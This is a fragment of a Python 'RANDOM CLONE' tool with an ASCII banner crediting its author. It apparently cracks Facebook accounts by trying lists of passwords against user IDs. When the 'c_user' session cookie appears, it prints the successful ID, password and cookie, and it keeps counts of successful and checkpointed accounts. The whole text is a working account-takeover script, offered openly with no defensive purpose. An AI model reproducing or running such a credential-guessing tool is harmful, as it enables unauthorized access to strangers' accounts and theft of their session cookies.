...
#######  #####   #####         #####  #     # ######  ####### ######  
    ...
    #     #####   #####         #####     #    ######  ####### #     # 
\033[1;37m----------------------------------------------------------------
  \033[1;37mAUTHOR    : SAIMUL ISLAM 
  \033[1;37mGITHUB    : TCS-CYBER-404
  \033[1;37mFACEBOOK  : private  
  \033[1;37mTOOL NAME : RANDOM CLONE 
  \033[1;37mTOOL TYPE : FREE
  \033[1;37mVERSION   : 0.0
\033[1;37m----------------------------------------------------------------"""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[1;92m[\033[1;92mTCS-OK\033[1;92m] \033[1;92m' +uid+ ' | ' +ps+    '  \n'+tahunng(cid))
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[TCS-%s/%s] \033[1;92m[OK-%s]\033[1;92m[CP-%s] \r'%(P,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [TCS-OK [🌹]  '+uid+' | '+ps+'\33[0;92m'+tahunng(uid))
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[TCS-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(P,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
